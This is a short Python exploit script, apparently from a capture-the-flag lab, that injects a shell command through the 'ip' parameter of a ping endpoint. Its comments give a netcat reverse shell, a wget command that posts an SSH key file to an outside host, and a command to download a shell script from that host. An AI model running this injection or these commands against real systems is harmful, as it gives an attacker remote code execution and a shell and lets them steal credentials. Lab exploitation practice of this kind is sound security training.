import requests

url = 'http://10.10.91.106:8081/ping'
# rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.8.57 4242 >/tmp/f
# wget --post-file=/home/r00t/.ssh/authorized http://10.11.8.57
# wget http://10.11.8.57/shell.sh -o shell.sh
r = requests.get(url, params={
    'ip': '`ls /`'
})

print(r.text)